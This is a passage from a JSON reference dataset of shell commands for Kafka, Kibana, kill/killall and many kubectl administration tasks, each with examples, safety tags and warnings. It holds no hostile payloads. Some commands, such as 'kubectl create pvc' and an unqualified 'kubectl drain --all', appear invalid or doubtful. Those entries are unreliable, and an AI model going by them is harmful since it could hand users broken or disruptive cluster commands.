      "kafka-console-producer --bootstrap-server localhost:9092 --topic orders --property parse.key=true --property key.separator=:  # Produces messages with keys separated by colon",
      "echo 'Hello Kafka' | kafka-console-producer --bootstrap-server localhost:9092 --topic greetings  # Sends one message to topic using echo and pipe",
      "cat messages.txt | kafka-console-producer --bootstrap-server localhost:9092 --topic events  # Send all lines from file as separate messages",
      "kafka-console-producer --bootstrap-server localhost:9092 --topic orders --property compression.type=snappy --property batch.size=16384 --property linger.ms=5  # High-performance producer with compression and batching optimizations"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "data-processing",
    "safety": "safe",
    "syntaxPattern": "kafka-console-producer --bootstrap-server [server] --topic [topic] [options]",
    "prerequisites": [
      "kafka",
      "java"
    ],
    "commandCombinations": [
      {
        "scenario": "Produce messages from file with keys",
        "commands": "cat messages.txt | kafka-console-producer --bootstrap-server localhost:9092 --topic events --property parse.key=true",
        "explanation": "Reads messages from file and produces them with key parsing enabled",
        "title": "cat | kafka"
      },
      {
        "scenario": "Create topic and start producing",
        "commands": "kafka-topics --create --topic new-topic --bootstrap-server localhost:9092 --partitions 3 --replication-factor 1 && kafka-console-producer --bootstrap-server localhost:9092 --topic new-topic",
        "explanation": "Creates a new topic and immediately starts producing messages to it",
        "title": "kafka && kafka"
      }
    ],
    "relatedCommands": [
      {
        "name": "kafka-console-consumer",
        "relationship": "complement",
        "reason": "Consumer counterpart for reading messages from Kafka topics"
      },
      {
        "name": "kcat",
        "relationship": "alternative",
        "reason": "More feature-rich producer/consumer tool for Kafka"
      },
      {
        "name": "kafka-topics",
        "relationship": "dependency",
        "reason": "Used to create and manage topics before producing messages"
      }
    ],
    "warnings": [
      "Bootstrap server must be accessible and Kafka cluster must be running",
      "Topic must exist unless auto-creation is enabled",
      "Key-value separator must be specified when using key parsing",
      "Interactive mode blocks until Ctrl+C is pressed"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://kafka.apache.org/documentation/#quickstart_send"
      },
      {
        "platform": "macos",
        "url": "https://kafka.apache.org/documentation/#quickstart_send"
      },
      {
        "platform": "windows",
        "url": "https://kafka.apache.org/documentation/#quickstart_send"
      },
      {
        "platform": "generic",
        "url": "https://kafka.apache.org/documentation/#basic_ops_consumer_producer"
      }
    ],
    "distroNotes": {
      "windows": "Requires Kafka installation and proper PATH configuration",
      "linux": "Available through Kafka binary distribution or package managers",
      "macos": "Can be installed via Homebrew or Kafka binary distribution"
    }
  },
  {
    "name": "kibana",
    "subtitle": "Kibana Analytics Platform",
    "description": "Data visualization and exploration tool for Elasticsearch",
    "examples": [
      "kibana  # Start Kibana server with default settings",
      "kibana --config /path/to/kibana.yml  # Start with custom configuration file",
      "kibana --elasticsearch.hosts=http://localhost:9200  # Connect to custom Elasticsearch instance",
      "kibana --server.port=5601 --server.host=0.0.0.0  # Start Kibana accessible on all interfaces",
      "kibana --elasticsearch.hosts=['http://es1:9200','http://es2:9200','http://es3:9200'] --logging.level=debug --server.ssl.enabled=true  # Production Kibana with Elasticsearch cluster and SSL"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "data-processing",
    "safety": "safe",
    "syntaxPattern": "kibana [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Development setup",
        "commands": "kibana --server.host=0.0.0.0 --server.port=5601",
        "explanation": "Start Kibana accessible from network",
        "title": "kibana"
      }
    ],
    "relatedCommands": [
      {
        "name": "elasticsearch",
        "relationship": "depends-on",
        "reason": "Kibana requires Elasticsearch as data source"
      },
      {
        "name": "logstash",
        "relationship": "combo",
        "reason": "Part of ELK stack for log analysis"
      }
    ],
    "warnings": [
      "Default port is 5601",
      "Requires Elasticsearch to be running",
      "Index patterns must be configured"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://www.elastic.co/guide/en/kibana/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "kill",
    "subtitle": "kill",
    "description": "Terminate processes by sending signals",
    "examples": [
      "kill 1234  # Send TERM signal to process ID 1234 for clean shutdown",
      "kill -9 1234  # Send KILL signal to immediately terminate process",
      "killall firefox  # Terminate all processes named firefox",
      "kill -HUP 1234  # Send hangup signal to reload process configuration",
      "kill 0  # Terminate all processes in current process group",
      "kill -CONT $(pgrep -f 'my_suspended_app')  # Resume suspended process by sending CONT signal to matching process name"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "system",
    "safety": "dangerous",
    "syntaxPattern": "kill [options] <pid>...",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Find and kill process in one command",
        "commands": "ps aux | grep 'node server' | grep -v grep | awk '{print $2}' | xargs kill",
        "explanation": "Find Node.js server process and terminate it",
        "title": "ps | grep | grep | awk | xargs"
      },
      {
        "scenario": "Kill processes using specific port",
        "commands": "lsof -ti:8080 | xargs kill -9",
        "explanation": "Force kill all processes using port 8080",
        "title": "lsof | xargs"
      }
    ],
    "relatedCommands": [
      {
        "name": "ps",
        "relationship": "combo",
        "reason": "Use ps to find process ID before killing"
      },
      {
        "name": "killall",
        "relationship": "alternative",
        "reason": "Kill processes by name instead of PID"
      },
      {
        "name": "pkill",
        "relationship": "alternative",
        "reason": "Kill processes using pattern matching"
      }
    ],
    "warnings": [
      "kill -9 should be last resort - doesn't allow clean shutdown",
      "Cannot kill init process (PID 1)",
      "May need sudo to kill processes owned by other users"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/kill.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/kill.html"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL only"
    }
  },
  {
    "name": "killall",
    "subtitle": "kill all",
    "description": "Kill processes by name",
    "examples": [
      "killall firefox  # Terminate all Firefox processes by name",
      "killall -HUP nginx  # Send hangup signal to nginx for configuration reload",
      "killall -i chrome  # Prompt before killing each Chrome process",
      "killall -e python3.9  # Kill only processes with exact name match",
      "killall -w myapp  # Wait until all myapp processes have actually terminated",
      "killall -9 stuck_process  # Force kill all instances of stuck_process",
      "killall -u username -TERM  # Gracefully terminate all processes owned by specific user for session cleanup"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "system",
    "safety": "safe",
    "syntaxPattern": "killall [options] <name>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Restart service gracefully",
        "commands": "killall -TERM apache2 && sleep 2 && systemctl start apache2",
        "explanation": "Gracefully stop Apache then restart it",
        "title": "killall && sleep && systemctl"
      },
      {
        "scenario": "Force kill stuck processes",
        "commands": "killall myapp || killall -9 myapp",
        "explanation": "Try normal kill first, then force kill if needed",
        "title": "killall || killall"
      }
    ],
    "relatedCommands": [
      {
        "name": "pkill",
        "relationship": "similar",
        "reason": "More flexible pattern matching for killing processes"
      },
      {
        "name": "kill",
        "relationship": "basic",
        "reason": "Kill specific processes by PID"
      },
      {
        "name": "pgrep",
        "relationship": "find",
        "reason": "Find process IDs before using kill"
      }
    ],
    "warnings": [
      "killall kills ALL processes with matching name",
      "Process name must match exactly (use -e for strict matching)",
      "On some systems, killall without arguments kills ALL processes"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/killall.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/killall.html"
      },
      {
        "platform": "generic",
        "url": "https://psmisc.sourceforge.io/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "kubectl",
    "subtitle": "Kube Control",
    "description": "Kubernetes command-line tool for cluster management",
    "examples": [
      "kubectl cluster-info  # Display cluster endpoints and services",
      "kubectl get pods  # Show pods in default namespace",
      "kubectl describe pod nginx-pod  # Show detailed information about specific pod",
      "kubectl create deployment nginx --image=nginx:latest  # Deploy nginx container to cluster",
      "kubectl scale deployment nginx --replicas=3  # Scale nginx deployment to 3 replicas",
      "kubectl logs nginx-pod -f  # Follow logs from nginx pod",
      "kubectl exec -it nginx-pod -- /bin/bash  # Open interactive shell in running pod",
      "kubectl apply -f deployment.yaml  # Apply YAML configuration to cluster",
      "kubectl port-forward nginx-pod 8080:80  # Forward local port 8080 to pod port 80",
      "kubectl delete deployment nginx  # Remove nginx deployment and associated pods",
      "kubectl create secret generic app-secrets --from-literal=db-user=admin --from-literal=db-password='secure123' --dry-run=client -o yaml | kubectl apply -f -  # Create secrets from literals with YAML preview and application"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "dangerous",
    "syntaxPattern": "kubectl [command] [type] [name] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Application deployment workflow",
        "commands": "kubectl create deployment myapp --image=myapp:v1 && kubectl expose deployment myapp --port=80 --type=LoadBalancer && kubectl get svc",
        "explanation": "Deploy app, expose as service, check service status",
        "title": "kubectl && kubectl && kubectl"
      },
      {
        "scenario": "Troubleshooting pod issues",
        "commands": "kubectl get pods && kubectl describe pod failing-pod && kubectl logs failing-pod --previous",
        "explanation": "List pods, get details, check previous container logs",
        "title": "kubectl && kubectl && kubectl"
      },
      {
        "scenario": "Rollout new version and check status",
        "commands": "kubectl set image deployment/myapp container=myapp:v2 && kubectl rollout status deployment/myapp",
        "explanation": "Updates deployment image and monitors rollout progress",
        "title": "kubectl && kubectl"
      }
    ],
    "relatedCommands": [
      {
        "name": "docker",
        "relationship": "combo",
        "reason": "Kubernetes orchestrates Docker containers"
      },
      {
        "name": "helm",
        "relationship": "combo",
        "reason": "Helm package manager uses kubectl"
      },
      {
        "name": "terraform",
        "relationship": "complement",
        "reason": "Terraform can provision Kubernetes clusters"
      }
    ],
    "warnings": [
      "Requires kubeconfig file for cluster access",
      "Context determines which cluster/namespace",
      "Resource changes can affect running applications",
      "RBAC permissions may restrict certain operations",
      "Resource names must be unique within their namespace",
      "Some operations may take time to propagate across cluster"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://kubernetes.io/docs/reference/kubectl/"
      },
      {
        "platform": "macos",
        "url": "https://kubernetes.io/docs/reference/kubectl/"
      },
      {
        "platform": "windows",
        "url": "https://kubernetes.io/docs/reference/kubectl/"
      }
    ],
    "distroNotes": {
      "linux": "Available through package managers or direct download",
      "windows": "Available through Chocolatey or direct download",
      "macos": "Available through Homebrew or direct download"
    }
  },
  {
    "name": "kubectl-cluster-management",
    "subtitle": "Kubernetes Control",
    "description": "Kubernetes cluster administration and management",
    "examples": [
      "kubectl cluster-info dump --output-directory=/tmp/cluster-state  # Dump complete cluster state information for debugging",
      "kubectl label nodes worker-1 node-role.kubernetes.io/worker= zone=us-west-1  # Label node with role and zone for workload placement",
      "kubectl create quota dev-quota --hard=cpu=10,memory=20Gi,pods=10 -n development  # Create resource quota for development namespace",
      "kubectl drain worker-1 --ignore-daemonsets --delete-emptydir-data --force --grace-period=300  # Safely drain node for maintenance with extended grace period",
      "kubectl create token admin --duration=8760h --namespace=kube-system  # Create long-lived service account token for admin access",
      "kubectl apply -f crd.yaml && kubectl get crd myresource.example.com -o yaml  # Apply custom resource definition and inspect its configuration",
      "kubectl create clusterrolebinding admin-binding --clusterrole=cluster-admin --serviceaccount=kube-system:admin-user --dry-run=client -o yaml > rbac.yaml  # Generate RBAC configuration for service account with cluster admin privileges"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "dangerous",
    "syntaxPattern": "kubectl [options] <command> [flags]",
    "prerequisites": [
      "kubernetes-cluster"
    ],
    "commandCombinations": [
      {
        "scenario": "Cluster upgrade preparation",
        "commands": "kubectl get nodes -o wide && kubectl drain --all --ignore-daemonsets --delete-emptydir-data && kubectl get pods --all-namespaces | grep -v Running",
        "explanation": "Check node status, drain all nodes, and verify no running pods",
        "title": "kubectl && kubectl && kubectl | grep"
      },
      {
        "scenario": "Troubleshooting cluster issues",
        "commands": "kubectl get events --sort-by='.metadata.creationTimestamp' && kubectl top nodes && kubectl describe nodes | grep -A 5 Conditions",
        "explanation": "Get recent events, check resource usage, and inspect node conditions",
        "title": "kubectl && kubectl && kubectl | grep"
      }
    ],
    "relatedCommands": [
      {
        "name": "helm",
        "relationship": "combo",
        "reason": "Helm uses kubectl for deploying packages to Kubernetes"
      },
      {
        "name": "docker",
        "relationship": "underlying",
        "reason": "Kubernetes orchestrates Docker containers"
      },
      {
        "name": "kubeadm",
        "relationship": "combo",
        "reason": "Kubeadm is used for cluster bootstrapping and management"
      }
    ],
    "warnings": [
      "kubectl context determines which cluster commands affect",
      "Resource deletions may hang if finalizers are not properly handled",
      "Some operations require cluster-admin privileges"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://kubernetes.io/docs/reference/kubectl/"
      },
      {
        "platform": "macos",
        "url": "https://kubernetes.io/docs/reference/kubectl/"
      },
      {
        "platform": "windows",
        "url": "https://kubernetes.io/docs/reference/kubectl/"
      },
      {
        "platform": "generic",
        "url": "https://kubernetes.io/docs/reference/kubectl/cheatsheet/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "kubectl-networking-services",
    "subtitle": "Kubernetes Networking",
    "description": "Kubernetes networking and service management",
    "examples": [
      "kubectl expose deployment web --type=LoadBalancer --port=80 --target-port=8080 --load-balancer-ip=203.0.113.100  # Expose deployment as LoadBalancer service with specific external IP",
      "kubectl create service clusterip mysql --tcp=3306:3306 --clusterip=None  # Create headless service for StatefulSet pod discovery",
      "kubectl create ingress web --class=nginx --rule='example.com/*=web:80,tls=web-tls'  # Create Ingress with TLS termination and specific ingress class",
      "kubectl apply -f - <<EOF\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: deny-all\nspec:\n  podSelector: {}\n  policyTypes:\n  - Ingress\n  - Egress\nEOF  # Create network policy to deny all ingress and egress traffic by default",
      "kubectl get endpoints web -o yaml && kubectl get endpointslices -l kubernetes.io/service-name=web  # Inspect service endpoints and endpoint slices for debugging",
      "kubectl port-forward service/web 8080:80 --address=0.0.0.0  # Forward local port to service, accessible from all interfaces",
      "kubectl patch service web -p '{\"spec\":{\"type\":\"NodePort\",\"ports\":[{\"port\":80,\"targetPort\":8080,\"nodePort\":30080}]}}' && kubectl get nodes -o wide  # Convert service to NodePort and show node IPs for external access"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "networking",
    "safety": "caution",
    "syntaxPattern": "kubectl <service-command> [options]",
    "prerequisites": [
      "kubernetes-cluster"
    ],
    "commandCombinations": [
      {
        "scenario": "Service discovery troubleshooting",
        "commands": "kubectl get services -o wide && kubectl get endpoints && kubectl run test-pod --rm -it --image=busybox -- nslookup web.default.svc.cluster.local",
        "explanation": "Check services, endpoints, and DNS resolution from within cluster",
        "title": "kubectl && kubectl && kubectl"
      },
      {
        "scenario": "Ingress traffic debugging",
        "commands": "kubectl describe ingress web && kubectl get ingress web -o yaml && kubectl logs -l app=ingress-nginx",
        "explanation": "Inspect Ingress configuration and check ingress controller logs",
        "title": "kubectl && kubectl && kubectl"
      }
    ],
    "relatedCommands": [
      {
        "name": "dig",
        "relationship": "combo",
        "reason": "DNS troubleshooting for Kubernetes services"
      },
      {
        "name": "curl",
        "relationship": "combo",
        "reason": "Testing service connectivity and endpoints"
      },
      {
        "name": "istio",
        "relationship": "enhanced",
        "reason": "Service mesh provides advanced networking capabilities"
      }
    ],
    "warnings": [
      "Service ClusterIP is only accessible from within the cluster",
      "Ingress requires an ingress controller to function",
      "Network policies require a CNI plugin that supports them"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://kubernetes.io/docs/concepts/services-networking/"
      },
      {
        "platform": "macos",
        "url": "https://kubernetes.io/docs/concepts/services-networking/"
      },
      {
        "platform": "windows",
        "url": "https://kubernetes.io/docs/concepts/services-networking/"
      },
      {
        "platform": "generic",
        "url": "https://kubernetes.io/docs/concepts/services-networking/service/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "kubectl-secrets-config",
    "subtitle": "Kubernetes Secrets and Config",
    "description": "Kubernetes secrets and configuration management",
    "examples": [
      "kubectl create secret generic app-secrets --from-literal=database-password=secretpass --from-literal=api-key=abc123  # Create secret with multiple key-value pairs from command line",
      "kubectl create secret tls web-tls --cert=path/to/cert.crt --key=path/to/cert.key  # Create TLS secret from certificate and private key files",
      "kubectl create secret docker-registry regcred --docker-server=myregistry.io --docker-username=user --docker-password=pass --docker-email=user@example.com  # Create secret for private Docker registry authentication",
      "kubectl create configmap app-config --from-file=config/ --from-literal=log-level=debug --from-env-file=.env  # Create ConfigMap from directory, literal values, and environment file",
      "echo -n secretvalue | kubectl create secret generic mysecret --dry-run=client --from-file=key=/dev/stdin -o yaml | kubeseal -o yaml  # Create sealed secret that can be safely stored in Git",
      "kubectl create secret tls wildcard-cert --cert=wildcard.crt --key=wildcard.key && kubectl patch deployment webapp -p '{\"spec\":{\"template\":{\"spec\":{\"volumes\":[{\"name\":\"tls-certs\",\"secret\":{\"secretName\":\"wildcard-cert\"}}]}}}}' --dry-run=server  # Create TLS secret and prepare deployment patch with server-side validation",
      "kubectl create secret generic app-secrets-v2 --from-literal=password=newpass && kubectl patch deployment app -p '{\"spec\":{\"template\":{\"spec\":{\"volumes\":[{\"name\":\"secrets\",\"secret\":{\"secretName\":\"app-secrets-v2\"}}]}}}}'  # Create new secret version and update deployment to trigger rolling update"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "security",
    "safety": "safe",
    "syntaxPattern": "kubectl <config-command> [options]",
    "prerequisites": [
      "kubernetes-cluster"
    ],
    "commandCombinations": [
      {
        "scenario": "Secure application deployment",
        "commands": "kubectl create namespace secure-app && kubectl create secret generic db-creds --from-literal=username=admin --from-literal=password=secret123 -n secure-app && kubectl create configmap app-config --from-file=config.yaml -n secure-app",
        "explanation": "Create namespace, secrets, and config for secure application deployment",
        "title": "kubectl && kubectl && kubectl"
      },
      {
        "scenario": "Certificate management workflow",
        "commands": "openssl req -new -newkey rsa:4096 -x509 -sha256 -days 365 -nodes -out cert.crt -keyout cert.key && kubectl create secret tls app-tls --cert=cert.crt --key=cert.key && kubectl annotate secret app-tls cert-manager.io/issuer-name=letsencrypt-prod",
        "explanation": "Generate certificate, create TLS secret, and annotate for cert-manager",
        "title": "openssl && kubectl && kubectl"
      }
    ],
    "relatedCommands": [
      {
        "name": "base64",
        "relationship": "combo",
        "reason": "Kubernetes secrets are base64 encoded"
      },
      {
        "name": "openssl",
        "relationship": "combo",
        "reason": "Generate certificates and keys for TLS secrets"
      },
      {
        "name": "helm-secrets",
        "relationship": "alternative",
        "reason": "Helm plugin for managing secrets in Helm charts"
      }
    ],
    "warnings": [
      "Secrets are only base64 encoded, not encrypted at rest by default",
      "ConfigMaps have size limits and shouldn't contain sensitive data",
      "Updating secrets doesn't automatically restart pods using them"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://kubernetes.io/docs/concepts/configuration/"
      },
      {
        "platform": "macos",
        "url": "https://kubernetes.io/docs/concepts/configuration/"
      },
      {
        "platform": "windows",
        "url": "https://kubernetes.io/docs/concepts/configuration/"
      },
      {
        "platform": "generic",
        "url": "https://kubernetes.io/docs/concepts/configuration/secret/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "kubectl-storage-management",
    "subtitle": "Kubernetes Storage Management",
    "description": "Kubernetes persistent storage and volume management",
    "examples": [
      "kubectl apply -f - <<EOF\napiVersion: v1\nkind: PersistentVolume\nmetadata:\n  name: nfs-pv\nspec:\n  capacity:\n    storage: 10Gi\n  accessModes:\n    - ReadWriteMany\n  nfs:\n    server: nfs-server.example.com\n    path: /data\nEOF  # Create NFS-backed persistent volume with ReadWriteMany access",
      "kubectl apply -f - <<EOF\napiVersion: storage.k8s.io/v1\nkind: StorageClass\nmetadata:\n  name: fast-ssd\nprovisioner: kubernetes.io/aws-ebs\nparameters:\n  type: gp3\n  encrypted: 'true'\nallowVolumeExpansion: true\nvolumeBindingMode: WaitForFirstConsumer\nEOF  # Create storage class for encrypted SSD volumes with delayed binding",
      "kubectl create -f - <<EOF\napiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: web\nspec:\n  serviceName: web\n  replicas: 3\n  template:\n    spec:\n      containers:\n      - name: nginx\n        image: nginx\n        volumeMounts:\n        - name: data\n          mountPath: /usr/share/nginx/html\n  volumeClaimTemplates:\n  - metadata:\n      name: data\n    spec:\n      accessModes: [ReadWriteOnce]\n      storageClassName: fast-ssd\n      resources:\n        requests:\n          storage: 1Gi\nEOF  # Create StatefulSet with persistent volume claim templates",
      "kubectl patch pvc data-web-0 -p '{\"spec\":{\"resources\":{\"requests\":{\"storage\":\"5Gi\"}}}}'  # Expand persistent volume claim from 1Gi to 5Gi",
      "kubectl apply -f - <<EOF\napiVersion: snapshot.storage.k8s.io/v1\nkind: VolumeSnapshot\nmetadata:\n  name: data-snapshot\nspec:\n  volumeSnapshotClassName: csi-snapclass\n  source:\n    persistentVolumeClaimName: data-web-0\nEOF  # Create volume snapshot of persistent volume claim",
      "kubectl describe pv && kubectl describe pvc && kubectl get events --sort-by=.metadata.creationTimestamp | grep -i volume  # Inspect persistent volumes, claims, and related events",
      "kubectl apply -f - <<EOF\napiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: database-cluster\nspec:\n  replicas: 3\n  serviceName: database\n  volumeClaimTemplates:\n  - metadata:\n      name: data\n    spec:\n      accessModes: [ReadWriteOnce]\n      storageClassName: fast-ssd\n      resources:\n        requests:\n          storage: 50Gi\nEOF && kubectl wait --for=condition=ready pod -l app=database-cluster --timeout=300s  # Deploy StatefulSet with persistent storage and wait for readiness"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "kubectl <storage-command> [options]",
    "prerequisites": [
      "kubernetes-cluster"
    ],
    "commandCombinations": [
      {
        "scenario": "Database backup with snapshots",
        "commands": "kubectl exec db-0 -- pg_dump -U postgres mydb > /tmp/backup.sql && kubectl apply -f volume-snapshot.yaml && kubectl wait --for=condition=ReadyToUse volumesnapshot/db-snapshot",
        "explanation": "Create database backup and volume snapshot, wait for completion",
        "title": "kubectl > && kubectl && kubectl"
      },
      {
        "scenario": "Storage migration workflow",
        "commands": "kubectl create pvc new-storage --storageclass=fast-ssd --size=10Gi && kubectl create job migrate-data --image=busybox -- sh -c 'cp -r /old-data/* /new-data/' && kubectl patch deployment app -p '{\"spec\":{\"template\":{\"spec\":{\"volumes\":[{\"name\":\"data\",\"persistentVolumeClaim\":{\"claimName\":\"new-storage\"}}]}}}}'",
        "explanation": "Create new PVC, migrate data, and update deployment to use new storage",
        "title": "kubectl && kubectl && kubectl"
      }
    ],
    "relatedCommands": [
      {
        "name": "docker-volume",
        "relationship": "similar",
        "reason": "Both manage persistent storage for containers"
      },
      {
        "name": "lvm",
        "relationship": "underlying",
        "reason": "Some storage providers use LVM for volume management"
      },
      {
        "name": "rsync",
        "relationship": "combo",
        "reason": "Can be used for data migration between volumes"
      }
    ],
    "warnings": [
      "Volume expansion requires storage class to support it",
      "ReadWriteOnce volumes can only be mounted by one node",
      "Persistent volumes have reclaim policies that affect data retention"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://kubernetes.io/docs/concepts/storage/"
      },
      {
        "platform": "macos",
        "url": "https://kubernetes.io/docs/concepts/storage/"
      },
      {
        "platform": "windows",
        "url": "https://kubernetes.io/docs/concepts/storage/"
      },
      {
        "platform": "generic",
        "url": "https://kubernetes.io/docs/concepts/storage/persistent-volumes/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "kubectl-workload-management",
    "subtitle": "Kubernetes Workload Management",
    "description": "Kubernetes workload deployment and management",
    "examples": [
      "kubectl create deployment web --image=nginx:1.21 --replicas=3 --port=80 && kubectl annotate deployment web deployment.kubernetes.io/revision=1  # Create deployment with specific configuration and annotations",
      "kubectl patch deployment web -p '{\"spec\":{\"strategy\":{\"rollingUpdate\":{\"maxSurge\":1,\"maxUnavailable\":0}}}}'  # Configure rolling update strategy to maintain availability",
      "kubectl autoscale deployment web --min=2 --max=10 --cpu-percent=70  # Create HPA to scale deployment based on CPU utilization",
      "kubectl create pdb web-pdb --selector=app=web --min-available=2  # Create pod disruption budget to ensure minimum availability",
      "kubectl create job data-migration --image=migrator:latest -- /scripts/migrate.sh && kubectl wait --for=condition=complete job/data-migration --timeout=600s  # Create job and wait for completion with timeout",
      "kubectl create cronjob backup --image=backup-tool --schedule='0 2 * * *' -- /scripts/backup.sh  # Create scheduled job that runs daily at 2 AM",
      "kubectl create deployment webapp --image=nginx:1.21 --replicas=5 && kubectl set resources deployment webapp --requests=cpu=100m,memory=128Mi --limits=cpu=500m,memory=512Mi && kubectl autoscale deployment webapp --min=3 --max=20 --cpu-percent=70 && kubectl create pdb webapp-pdb --selector=app=webapp --max-unavailable=1  # Deploy production workload with resource limits, HPA scaling, and disruption budget"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "kubectl <resource-type> <command> [options]",
    "prerequisites": [
      "kubernetes-cluster"
    ],
    "commandCombinations": [
      {
        "scenario": "Blue-green deployment pattern",
        "commands": "kubectl create deployment blue --image=app:v1 && kubectl create deployment green --image=app:v2 && kubectl patch service web -p '{\"spec\":{\"selector\":{\"version\":\"green\"}}}'",
        "explanation": "Deploy two versions and switch service selector for blue-green deployment",
        "title": "kubectl && kubectl && kubectl"
      },
      {
        "scenario": "Canary deployment with traffic splitting",
        "commands": "kubectl scale deployment web-v1 --replicas=7 && kubectl scale deployment web-v2 --replicas=3 && kubectl get pods -l app=web",
        "explanation": "Scale deployments to achieve 70/30 traffic split for canary testing",
        "title": "kubectl && kubectl && kubectl"
      }
    ],
    "relatedCommands": [
      {
        "name": "helm",
        "relationship": "alternative",
        "reason": "Helm provides templated deployment management"
      },
      {
        "name": "kustomize",
        "relationship": "combo",
        "reason": "Kustomize customizes Kubernetes manifests"
      },
      {
        "name": "docker",
        "relationship": "underlying",
        "reason": "Workloads run containerized applications"
      }
    ],
    "warnings": [
      "Deployment rollbacks only keep limited revision history",
      "Resource requests and limits affect scheduling and QoS",
      "Pod security policies may prevent certain workload configurations"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://kubernetes.io/docs/concepts/workloads/"
      },
      {
        "platform": "macos",
        "url": "https://kubernetes.io/docs/concepts/workloads/"
      },
      {
        "platform": "windows",
        "url": "https://kubernetes.io/docs/concepts/workloads/"
      },
      {
        "platform": "generic",
        "url": "https://kubernetes.io/docs/reference/kubectl/cheatsheet/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "kubernetes-advanced-scheduling",
    "subtitle": "Kubernetes Advanced Scheduling",
    "description": "Advanced Kubernetes scheduling and resource management",
    "examples": [
      "kubectl apply -f - <<EOF\napiVersion: v1\nkind: Pod\nmetadata:\n  name: web-server\nspec:\n  affinity:\n    podAffinity:\n      requiredDuringSchedulingIgnoredDuringExecution:\n      - labelSelector:\n          matchExpressions:\n          - key: app\n            operator: In\n            values:\n            - database\n        topologyKey: kubernetes.io/hostname\n    podAntiAffinity:\n      preferredDuringSchedulingIgnoredDuringExecution:\n      - weight: 100\n        podAffinityTerm:\n          labelSelector:\n            matchExpressions:\n            - key: app\n              operator: In\n              values:\n              - web-server\n          topologyKey: kubernetes.io/hostname\n  containers:\n  - name: web\n    image: nginx\nEOF  # Create pod with affinity to database pods and anti-affinity to other web servers",
      "kubectl taint nodes worker-1 gpu=true:NoSchedule && kubectl label nodes worker-1 hardware=gpu && kubectl apply -f - <<EOF\napiVersion: v1\nkind: Pod\nmetadata:\n  name: gpu-workload\nspec:\n  nodeSelector:\n    hardware: gpu\n  tolerations:\n  - key: gpu\n    operator: Equal\n    value: 'true'\n    effect: NoSchedule\n  containers:\n  - name: ml-training\n    image: tensorflow/tensorflow:latest-gpu\nEOF  # Taint node for GPU workloads, label it, and schedule pod with appropriate tolerations",
      "kubectl apply -f - <<EOF\napiVersion: scheduling.k8s.io/v1\nkind: PriorityClass\nmetadata:\n  name: high-priority\nvalue: 1000000\nglobalDefault: false\ndescription: High priority class for critical workloads\n---\napiVersion: v1\nkind: Pod\nmetadata:\n  name: critical-app\nspec:\n  priorityClassName: high-priority\n  containers:\n  - name: app\n    image: nginx\nEOF  # Create high priority class and schedule pod with priority for preemption",
      "kubectl create namespace resource-limited && kubectl apply -f - <<EOF\napiVersion: v1\nkind: ResourceQuota\nmetadata:\n  name: compute-quota\n  namespace: resource-limited\nspec:\n  hard:\n    requests.cpu: '4'\n    requests.memory: 8Gi\n    limits.cpu: '8'\n    limits.memory: 16Gi\n    persistentvolumeclaims: '10'\n---\napiVersion: v1\nkind: LimitRange\nmetadata:\n  name: mem-limit-range\n  namespace: resource-limited\nspec:\n  limits:\n  - default:\n      memory: 512Mi\n      cpu: 500m\n    defaultRequest:\n      memory: 256Mi\n      cpu: 100m\n    type: Container\nEOF  # Create namespace with resource quota and default container limits",
      "kubectl apply -f - <<EOF\napiVersion: autoscaling.k8s.io/v1\nkind: VerticalPodAutoscaler\nmetadata:\n  name: webapp-vpa\nspec:\n  targetRef:\n    apiVersion: apps/v1\n    kind: Deployment\n    name: webapp\n  updatePolicy:\n    updateMode: 'Auto'\n  resourcePolicy:\n    containerPolicies:\n    - containerName: web\n      maxAllowed:\n        cpu: 2\n        memory: 2Gi\n      minAllowed:\n        cpu: 100m\n        memory: 128Mi\nEOF  # Create VPA to automatically adjust resource requests based on usage",
